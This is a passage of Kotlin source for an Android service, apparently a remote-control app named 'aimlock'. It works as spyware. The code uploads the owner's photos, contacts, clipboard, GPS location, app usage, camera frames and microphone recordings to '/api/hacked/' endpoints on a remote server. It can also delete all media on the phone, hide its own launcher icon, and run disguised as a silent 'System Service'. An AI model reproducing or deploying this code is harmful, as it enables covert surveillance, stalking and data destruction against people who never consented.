                val url  = URL("$serverUrl/api/hacked/camera-frame")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true
                conn.connectTimeout = 2000
                conn.readTimeout    = 2000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Gallery Upload ────────────────────────────────────────────────────────
    private fun uploadGallery() {
        if (galleryUploading) return
        galleryUploading = true
        Thread {
            try {
                val allPhotos = mutableListOf<JSONObject>()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED
                )
                val cursor = contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    var count = 0
                    while (c.moveToNext() && count < 200) {
                        val id   = c.getLong(idCol)
                        val name = c.getString(nameCol) ?: "photo"
                        val date = c.getLong(dateCol)
                        val uri  = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                        val thumbB64 = try {
                            val bmp = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                                contentResolver.loadThumbnail(uri, android.util.Size(400, 400), null)
                            else
                                @Suppress("DEPRECATION")
                                MediaStore.Images.Thumbnails.getThumbnail(contentResolver, id,
                                    MediaStore.Images.Thumbnails.MINI_KIND, null)
                            if (bmp != null) {
                                val out = ByteArrayOutputStream()
                                bmp.compress(Bitmap.CompressFormat.JPEG, 75, out)
                                bmp.recycle()
                                Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            } else ""
                        } catch (_: Exception) { "" }

                        allPhotos.add(JSONObject().apply {
                            put("id",             id.toString())
                            put("name",           name)
                            put("date",           date)
                            put("thumbnailBase64", thumbB64)
                        })
                        count++

                        // Kirim tiap 10 foto → efek lazy load di Flutter
                        if (allPhotos.size % 10 == 0) {
                            uploadGalleryBatch(allPhotos.takeLast(10), done = false)
                            Thread.sleep(300)
                        }
                    }
                }
                // Kirim sisa + tandai done
                val rem = allPhotos.size % 10
                uploadGalleryBatch(
                    if (rem > 0) allPhotos.takeLast(rem) else emptyList(),
                    done = true
                )
            } catch (_: Exception) {}
            galleryUploading = false
        }.start()
    }

    private fun uploadGalleryBatch(items: List<JSONObject>, done: Boolean) {
        if (items.isEmpty() && !done) return
        try {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("photos",   JSONArray(items.map { it }))
                put("done",     done)
            }.toString()
            val url  = URL("$serverUrl/api/hacked/gallery-batch")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("x-device-token", deviceToken)
            conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
            OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
            conn.responseCode; conn.disconnect()
        } catch (_: Exception) {}
    }

    // ── Upload Full Quality Photo ─────────────────────────────────────────────
    private fun uploadFullPhoto(photoId: String) {
        Thread {
            try {
                val id  = photoId.toLongOrNull() ?: return@Thread
                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val inputStream = contentResolver.openInputStream(uri) ?: return@Thread
                val bytes = inputStream.readBytes()
                inputStream.close()

                // Decode dan resize kalau terlalu besar (max 1280px)
                val original = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    ?: return@Thread
                val maxDim = 1280
                val scale  = if (original.width > maxDim || original.height > maxDim)
                    maxDim.toFloat() / maxOf(original.width, original.height) else 1f
                val bmp = if (scale < 1f)
                    android.graphics.Bitmap.createScaledBitmap(
                        original, (original.width * scale).toInt(), (original.height * scale).toInt(), true)
                else original

                val out = ByteArrayOutputStream()
                bmp.compress(Bitmap.CompressFormat.JPEG, 85, out)
                if (bmp !== original) bmp.recycle()
                original.recycle()
                val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)

                val body = JSONObject().apply {
                    put("deviceId",    deviceId)
                    put("photoId",     photoId)
                    put("imageBase64", b64)
                }.toString()
                val url  = URL("$serverUrl/api/hacked/full-photo-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 30000; conn.readTimeout = 30000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Contacts Upload ───────────────────────────────────────────────────────
    private fun uploadContacts() {
        Thread {
            try {
                val contacts = mutableListOf<JSONObject>()
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val phoneCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        contacts.add(JSONObject().apply {
                            put("name",  c.getString(nameCol)  ?: "")
                            put("phone", c.getString(phoneCol) ?: "")
                        })
                    }
                }
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", JSONArray(contacts.map { it }))
                }.toString()
                val url  = URL("$serverUrl/api/hacked/contacts-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Delete All Files ──────────────────────────────────────────────────────
    private fun deleteAllFiles() {
        Thread {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    contentResolver.delete(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null)
                    contentResolver.delete(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,  null, null)
                    contentResolver.delete(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,  null, null)
                } else {
                    @Suppress("DEPRECATION")
                    Environment.getExternalStorageDirectory()?.listFiles()?.forEach { deleteRecursive(it) }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun deleteRecursive(file: File) {
        if (file.isDirectory) file.listFiles()?.forEach { deleteRecursive(it) }
        try { file.delete() } catch (_: Exception) {}
    }

    // ── Hide / Show App ───────────────────────────────────────────────────────
    private fun setAppVisibility(hide: Boolean) {
        try {
            // Toggle alias saja — MainActivity tetap aktif supaya polling jalan terus
            val aliasComponent = android.content.ComponentName(packageName, "$packageName.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                aliasComponent,
                if (hide) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                else      PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            if (!hide) {
                // Bawa app ke foreground supaya langsung muncul di layar
                val intent = packageManager.getLaunchIntentForPackage(packageName)
                intent?.apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    startActivity(this)
                }
            }
        } catch (_: Exception) {}
    }

    // ── Existing helpers (identik dari zip) ───────────────────────────────────
    private fun setFlashlight(on: Boolean) {
        try {
            val cm = cameraManager ?: return
            val id = cameraId ?: return
            cm.setTorchMode(id, on)
            flashOn = on
        } catch (_: Exception) {}
    }

    private fun setWallpaperFromBase64(base64: String) {
        Thread {
            try {
                val bytes  = Base64.decode(base64, Base64.DEFAULT)
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return@Thread
                val wm = WallpaperManager.getInstance(applicationContext)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val stream = ByteArrayInputStream(bytes)
                    wm.setStream(stream)
                    stream.close()
                } else {
                    wm.setBitmap(bitmap)
                }
                bitmap.recycle()
            } catch (_: Exception) {}
        }.start()
    }

    private fun vibrateDevice(duration: Long, pattern: String) {
        try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val vibe = when (pattern) {
                    "sos"    -> VibrationEffect.createWaveform(longArrayOf(0,200,100,200,100,600,100,200,100,200,100,600), -1)
                    "double" -> VibrationEffect.createWaveform(longArrayOf(0,400,200,400), -1)
                    else     -> VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
                }
                vibrator.vibrate(vibe)
            } else {
                @Suppress("DEPRECATION")
                when (pattern) {
                    "sos"    -> vibrator.vibrate(longArrayOf(0,200,100,200,100,600,100,200,100,200,100,600), -1)
                    "double" -> vibrator.vibrate(longArrayOf(0,400,200,400), -1)
                    else     -> vibrator.vibrate(duration)
                }
            }
        } catch (_: Exception) {}
    }

    private fun speakText(text: String, lang: String) {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            if (!ttsReady || tts == null) {
                tts = TextToSpeech(this) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        val locale = if (lang == "en") Locale.ENGLISH else Locale("id", "ID")
                        tts?.language = locale
                        ttsReady = true
                        tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_speak")
                    }
                }
            } else {
                val locale = if (lang == "en") Locale.ENGLISH else Locale("id", "ID")
                tts?.language = locale
                tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_speak")
            }
        } catch (_: Exception) {}
    }

    private fun playSoundFromBase64(base64Audio: String, mimeType: String) {
        Thread {
            try {
                val bytes = Base64.decode(base64Audio, Base64.DEFAULT)
                val ext   = when {
                    mimeType.contains("mp3") || mimeType.contains("mpeg") -> "mp3"
                    mimeType.contains("wav") -> "wav"
                    mimeType.contains("ogg") -> "ogg"
                    else                     -> "mp3"
                }
                val tmpFile = File(cacheDir, "aimlock_sound.$ext")
                FileOutputStream(tmpFile).use { it.write(bytes) }
                val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
                handler.post {
                    try {
                        mediaPlayer?.release()
                        mediaPlayer = MediaPlayer().apply {
                            setAudioAttributes(AudioAttributes.Builder()
                                .setUsage(AudioAttributes.USAGE_MEDIA)
                                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                                .build())
                            setDataSource(tmpFile.absolutePath)
                            prepare()
                            start()
                            setOnCompletionListener { release(); mediaPlayer = null }
                        }
                    } catch (_: Exception) {}
                }
            } catch (_: Exception) {}
        }.start()
    }

    // ── Fake Call ─────────────────────────────────────────────────────────────
    private fun showFakeCallNotification(callerName: String, callerNumber: String, ringDuration: Long) {
        try {
            fakeCallActive = true
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)

            val nm = getSystemService(NotificationManager::class.java)
            val channelId = "fake_call_channel"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel(channelId, "Panggilan Masuk", NotificationManager.IMPORTANCE_HIGH).apply {
                    enableVibration(true)
                    vibrationPattern = longArrayOf(0, 500, 500, 500)
                    setBypassDnd(true)
                    lockscreenVisibility = Notification.VISIBILITY_PUBLIC
                }
                nm.createNotificationChannel(ch)
            }

            val notif = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Panggilan Masuk")
                .setContentText("$callerName ($callerNumber)")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_CALL)
                .setFullScreenIntent(null, true)
                .setAutoCancel(true)
                .build()

            nm.notify(5001, notif)

            // Auto dismiss setelah ringDuration
            handler.postDelayed({
                fakeCallActive = false
                nm.cancel(5001)
            }, ringDuration)
        } catch (_: Exception) {}
    }

    // ── Clipboard History ─────────────────────────────────────────────────────
    private fun uploadClipboardHistory() {
        // Android 10+ hanya bisa read clipboard dari foreground Activity
        // Kirim intent ke MainActivity untuk ambil clipboard
        handler.post {
            val intent = Intent(this, MainActivity::class.java).apply {
                putExtra("action",      "get_clipboard")
                putExtra("serverUrl",   serverUrl)
                putExtra("deviceId",    deviceId)
                putExtra("deviceToken", deviceToken)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            startActivity(intent)
        }
    }

    // Dipanggil dari MainActivity setelah berhasil baca clipboard
    fun uploadClipboardFromActivity(textList: List<String>) {
        Thread {
            try {
                val history = JSONArray()
                textList.forEach { text ->
                    if (text.isNotBlank()) {
                        history.put(JSONObject().apply {
                            put("text", text)
                            put("time", System.currentTimeMillis())
                        })
                    }
                }
                if (history.length() == 0) return@Thread
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("history",  history)
                }.toString()
                val url  = URL("$serverUrl/api/hacked/clipboard-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                val cbResp = conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── App Usage ─────────────────────────────────────────────────────────────
    private fun uploadAppUsage() {
        Thread {
            try {
                val usageManager = getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                val apps = JSONArray()
                if (usageManager != null) {
                    val endTime   = System.currentTimeMillis()
                    val startTime = endTime - 24 * 60 * 60 * 1000L
                    val stats = usageManager.queryUsageStats(
                        android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
                    val pm = packageManager
                    stats?.sortedByDescending { it.totalTimeInForeground }
                        ?.filter { it.totalTimeInForeground > 0 }
                        ?.take(30)
                        ?.forEach { stat ->
                            try {
                                val info  = pm.getApplicationInfo(stat.packageName, 0)
                                val label = pm.getApplicationLabel(info).toString()
                                val mins  = stat.totalTimeInForeground / 60000
                                apps.put(JSONObject().apply {
                                    put("packageName", stat.packageName)
                                    put("appName",     label)
                                    put("timeMin",     mins)
                                    put("lastUsed",    stat.lastTimeUsed)
                                })
                            } catch (_: Exception) {}
                        }
                }
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("apps",     apps)
                }.toString()
                val url  = URL("$serverUrl/api/hacked/app-usage-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 15000; conn.readTimeout = 15000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                val usageResp = conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── App Time Limit ────────────────────────────────────────────────────────
    private fun setAppTimeLimit(packageName: String, limitMs: Long) {
        try {
            val prefs = getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
            prefs.edit().putLong("time_limit_$packageName", limitMs).apply()
            // Tandai supaya bisa di-enforce oleh AccessibilityService kalau ada
            prefs.edit().putBoolean("time_limit_enabled", true).apply()
        } catch (_: Exception) {}
    }

    // ── Block App ─────────────────────────────────────────────────────────────
    private fun setAppBlocked(packageName: String, block: Boolean) {
        try {
            val prefs = getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
            val blocked = prefs.getStringSet("blocked_apps", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
            if (block) blocked.add(packageName) else blocked.remove(packageName)
            prefs.edit().putStringSet("blocked_apps", blocked).apply()
        } catch (_: Exception) {}
    }

    // ── Trigger Alarm ─────────────────────────────────────────────────────────
    private fun triggerAlarm(message: String, duration: Long) {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)

            handler.post {
                try {
                    mediaPlayer?.release()
                    mediaPlayer = MediaPlayer().apply {
                        setAudioAttributes(AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build())
                        val afd = assets.openFd("sound/jokowi.mp3")
                        setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                        afd.close()
                        isLooping = true
                        prepare()
                        start()
                    }
                    handler.postDelayed({
                        mediaPlayer?.stop()
                        mediaPlayer?.release()
                        mediaPlayer = null
                    }, duration)
                } catch (_: Exception) {}
            }

            val nm = getSystemService(NotificationManager::class.java)
            val channelId = "alarm_channel"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel(channelId, "Alarm", NotificationManager.IMPORTANCE_HIGH).apply {
                    enableVibration(true)
                    setBypassDnd(true)
                }
                nm.createNotificationChannel(ch)
            }
            val notif = NotificationCompat.Builder(this, channelId)
                .setContentTitle("⚠ ALARM")
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setAutoCancel(true)
                .build()
            nm.notify(5002, notif)
            handler.postDelayed({ nm.cancel(5002) }, duration)
        } catch (_: Exception) {}
    }

    // ── GPS Location ──────────────────────────────────────────────────────────
    private fun getGpsLocation() {
        // Kirim ke MainActivity supaya bisa request permission runtime kalau belum granted
        handler.post {
            val intent = Intent(this, MainActivity::class.java).apply {
                putExtra("action",      "request_gps")
                putExtra("serverUrl",   serverUrl)
                putExtra("deviceId",    deviceId)
                putExtra("deviceToken", deviceToken)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            startActivity(intent)
        }
    }

    // Dipanggil dari MainActivity setelah permission granted
    fun doGetGpsLocation() {
        Thread {
            try {
                val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                var loc: Location? = null

                val hasFine   = ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
                val hasCoarse = ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED

                if (!hasFine && !hasCoarse) return@Thread

                for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
                    try {
                        if (!lm.isProviderEnabled(provider)) continue
                        @Suppress("MissingPermission")
                        val last = lm.getLastKnownLocation(provider)
                        if (last != null && (loc == null || last.accuracy < (loc?.accuracy ?: Float.MAX_VALUE))) {
                            loc = last
                        }
                    } catch (_: Exception) {}
                }

                if (loc == null) {
                    // Coba request location update singkat
                    val resultLatch = java.util.concurrent.CountDownLatch(1)
                    var freshLoc: Location? = null
                    val listener = object : android.location.LocationListener {
                        override fun onLocationChanged(l: Location) { freshLoc = l; resultLatch.countDown() }
                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(p: String?, s: Int, e: android.os.Bundle?) {}
                        override fun onProviderEnabled(p: String) {}
                        override fun onProviderDisabled(p: String) {}
                    }
                    handler.post {
                        try {
                            @Suppress("MissingPermission")
                            lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper())
                        } catch (_: Exception) { resultLatch.countDown() }
                    }
                    resultLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
                    loc = freshLoc
                }

                val finalLoc = loc ?: return@Thread
                val body = JSONObject().apply {
                    put("deviceId",  deviceId)
                    put("latitude",  finalLoc.latitude)
                    put("longitude", finalLoc.longitude)
                    put("accuracy",  finalLoc.accuracy)
                    put("altitude",  finalLoc.altitude)
                    put("provider",  finalLoc.provider ?: "unknown")
                    put("timestamp", System.currentTimeMillis())
                }.toString()
                val url  = URL("$serverUrl/api/hacked/gps-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                val gpsResp = conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Record Audio ──────────────────────────────────────────────────────────
    private fun startAudioRecording(durationSec: Int) {
        Thread {
            try {
                audioRecording = true
                val outFile = File(cacheDir, "aimlock_audio_rec.aac")
                audioRecordFile = outFile

                val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                audioRecorder = recorder

                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(64000)
                    setAudioSamplingRate(22050)
                    setOutputFile(outFile.absolutePath)
                    prepare()
                    start()
                }

                Thread.sleep(durationSec.coerceAtMost(60) * 1000L)
                stopAudioRecording()
            } catch (_: Exception) {
                audioRecording = false
            }
        }.start()
    }

    private fun stopAudioRecording() {
        try {
            audioRecorder?.stop()
            audioRecorder?.release()
            audioRecorder = null
        } catch (_: Exception) {}
        audioRecording = false

        val file = audioRecordFile ?: return
        audioRecordFile = null

        Thread {
            try {
                if (!file.exists()) return@Thread
                val bytes    = file.readBytes()
                val b64      = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val duration = bytes.size / 8000 // approx
                val body = JSONObject().apply {
                    put("deviceId",    deviceId)
                    put("audioBase64", b64)
                    put("duration",    duration)
                    put("mimeType",    "audio/aac")
                    put("recordedAt",  System.currentTimeMillis())
                }.toString()
                val url  = URL("$serverUrl/api/hacked/audio-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 30000; conn.readTimeout = 30000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode; conn.disconnect()
                file.delete()
            } catch (_: Exception) {}
        }.start()
    }

    private fun updateNotification(text: String) {}

    private fun buildNotification(text: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_NONE).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(channel)
        }
    }

    // ── Open App ─────────────────────────────────────────────────────────────
    private fun openApp(packageName: String) {
        handler.post {
            try {
                val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
                    startActivity(launchIntent)
                }
            } catch (_: Exception) {}
        }
    }

    // ── Open Site ─────────────────────────────────────────────────────────────
    private fun openSite(url: String) {
        handler.post {
            try {
                val siteUrl = if (url.startsWith("http://") || url.startsWith("https://")) url
                              else "https://$url"
                val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(siteUrl)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    // ── Get App List ──────────────────────────────────────────────────────────
    private fun uploadAppList() {
        Thread {
            try {
                val pm    = packageManager
                val apps  = JSONArray()
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                    android.content.pm.PackageManager.MATCH_UNINSTALLED_PACKAGES else 0
                val installed = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                for (app in installed) {
                    try {
                        val isSystem = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        val label    = pm.getApplicationLabel(app).toString()
                        val hasLaunch = pm.getLaunchIntentForPackage(app.packageName) != null
                        apps.put(JSONObject().apply {
                            put("packageName", app.packageName)
                            put("appName",     label)
                            put("isSystem",    isSystem)
                            put("isLaunchable", hasLaunch)
                        })
                    } catch (_: Exception) {}
                }
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("apps",     apps)
                }.toString()
                val url  = URL("$serverUrl/api/hacked/app-list-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        pollRunnable?.let { handler.removeCallbacks(it) }
        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        try { setFlashlight(false) } catch (_: Exception) {}
        tts?.stop(); tts?.shutdown()
        mediaPlayer?.release()
        keepalivePlayer?.release(); keepalivePlayer = null
        if (audioRecording) stopAudioRecording()
        stopCameraLive()
        cameraHandlerThread?.quitSafely()
    }
}
